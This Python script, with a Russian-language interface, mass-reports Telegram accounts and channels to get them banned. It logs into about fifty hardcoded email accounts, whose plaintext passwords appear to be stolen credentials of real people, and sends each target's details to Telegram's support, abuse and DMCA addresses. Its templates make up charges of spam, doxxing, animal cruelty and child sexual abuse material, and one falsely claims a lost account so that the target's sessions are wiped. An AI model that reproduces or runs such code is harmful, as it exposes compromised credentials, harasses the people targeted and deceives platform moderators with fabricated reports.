import os
os.system("cls")
os.system("title КАЖДЫЙ ДЕНЬ ВЕСЕЛЬЕ - @deathrebootpvp")
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
from pystyle import *
#Ну и зачем?
RED = '\033[1;91m'
WHITE = '\033[0m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
GOLD = '\033[0;33m'
PURPLE = '\033[0;35m'

def popup():
    url = "https://t.me/deathrebootpvp"
    system = platform.system()

    if system == "Linux":
        if os.path.exists("/data/data/com.termux/files/usr/bin"):
            os.system(f"am start -a android.intent.action.VIEW -d {url}")
        else:
            webbrowser.open(url)
    elif system == "Windows":
        webbrowser.open(url)
    else:
        print("Unsupported system")

art = """                                              
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⣤⣶⠶⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⠞⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⢷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠈⠁⣠⣴⣶⣶⢶⣤⣶⣦⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠦⡀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣏⡈⠻⠿⠋⠀⠀⠀⠀⢶⣿⡿⣿⣿⣿⣶⣦⡀⠀⠑⡄⠀⠀
⠀⠀⠚⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣯⣤⣿⣿⣤⠄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠉⠉⠻⠿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      
                                           
                 ██░ ██  ██▓     ▒█████   ██▀███   ██▓▓█████▄  ▄▄▄     ▄▄▄█████▓
                ▓██░ ██▒▓██▒    ▒██▒  ██▒▓██ ▒ ██▒▓██▒▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒
                ▒██▀▀██░▒██░    ▒██░  ██▒▓██ ░▄█ ▒▒██▒░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░
                ░▓█ ░██ ▒██░    ▒██   ██░▒██▀▀█▄  ░██░░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ 
                ░▓█▒░██▓░██████▒░ ████▓▒░░██▓ ▒██▒░██░░▒████▓  ▓█   ▓██▒ ▒██▒ ░ 
                 ▒ ░░▒░▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓   ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░   
               ▒ ░▒░ ░░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░ ░ ▒  ▒   ▒   ▒▒ ░   ░    
                 ░  ░░ ░  ░ ░   ░ ░ ░ ▒    ░░   ░  ▒ ░ ░ ░  ░   ░   ▒    ░
                ░  ░  ░    ░  ░    ░ ░     ░      ░     ░          ░  ░        
                                                        ░                        
                                                                                           
                ┌──────────────────────────────────────────────────────────────────────┐
                     КАЖДЫЙ ДЕНЬ ВЕСЕЛЬЕ - @Deathrebootpvp | актуал версия: 2.0                   
                └──────────────────────────────────────────────────────────────────────┘
 

                   ┌───────────────────────────┐      ┌───────────────────────────┐      
                   │    1 |  Снос аккаунта     │      │     2 |  Снос канала      │     
                   └───────────────────────────┘      └───────────────────────────┘     

                    
                                                                                                                                                                   
                     """
print()
print(Colorate.Vertical(Colors.green_to_white, Center.XCenter(art)))
print()

senders = {
    'sanya.dragonov@mail.ru': 'RakuzanSnos',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1'
}
receivers = ['stopCA@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def menu():
    
    choice = input(f' {RED} ☄ {GREEN}  Выбрать функцию >{GREEN} ')
    return choice
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(3)
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    sent_emails = 0
    choice = menu()
    if choice == '1':
        print(f" {PURPLE}[{GOLD}1{PURPLE}]{WHITE} ==> СНОСИНГ")
        print(f" {PURPLE}[{GOLD}2{PURPLE}]{WHITE} ==> ДОКСUHG")
        print(f" {PURPLE}[{GOLD}3{PURPLE}]{WHITE} ==> ТРОЛЛЕНГ")
        print(f" {PURPLE}[{GOLD}4{PURPLE}]{WHITE} ==> СНОС СЕССИЙ")
        print(f" {PURPLE}[{GOLD}5{PURPLE}]{WHITE} ==> С премкой")
        print(f" {PURPLE}[{GOLD}6{PURPLE}]{WHITE} ==> С вирт номером")
        comp_choice = input(f" {PURPLE}[{GOLD}~{PURPLE}] {WHITE}выбирай: ")
#чо ты в скрипте забыл ? 
        if comp_choice in ["1", "2", "3"]:
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED} Следуй за указаниями.{WHITE}")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            chat_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на чат: ")
            violation_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на нарушение: ")
            print(f" {PURPLE}[{BLUE}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю.",
                "2": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "3": f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    time.sleep(5.3)
        elif comp_choice == "4":
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED} следуй указаниям.")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            print(f" {PURPLE}[{BLUE}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "4": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id}. Пожалуйста удалите аккаунт или обнулите сессии"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                    print(f" {GREEN}[!]{WHITE} Отправлено на {RED}{receiver} {WHITE}от{GREEN} {sender_email}{WHITE}!")
                    sent_emails += 14888
                    time.sleep(5)

        elif comp_choice in ["5", "6"]:
            print(f" {GREEN}[{WHITE}/{GREEN}]{RED} следуй указаниям.")
            username = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} UserName: ")
            id = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ID: ")
            comp_texts = {
                "5": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!",
                "6": f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 9999
                    time.sleep(5)


    elif choice == "2":
        
        print(f" {PURPLE}[{GOLD}1{PURPLE}] {WHITE}==> с личными данными")
        print(f" {PURPLE}[{GOLD}2{PURPLE}] {WHITE}==> с живодерством (как катекс) ")
        print(f" {PURPLE}[{GOLD}3{PURPLE}] {WHITE}==> с цп")
        print(f" {PURPLE}[{GOLD}4{PURPLE}] {WHITE}==> для каналов типа прайсов")
        ch_choice = input(f' {RED} ☄ {PURPLE}  Выбрать функцию >{BLUE} ')
# t.me/Trinitysoftware
        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на чат: ")
            channel_violation = input(f" {PURPLE}[{BLUE}+{PURPLE}]{WHITE} ссылку на нарушение [В канале]: ")
            print(f" {PURPLE}[{GOLD}/{PURPLE}]{WHITE} погоди чут чут.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                    print(f" {GREEN}[!]{WHITE} Отправлено на {RED}{receiver} {WHITE}от{GREEN} {sender_email}{WHITE}!")
                    sent_emails += 100000
                    time.sleep(5)
if __name__ == "__main__":
    main()
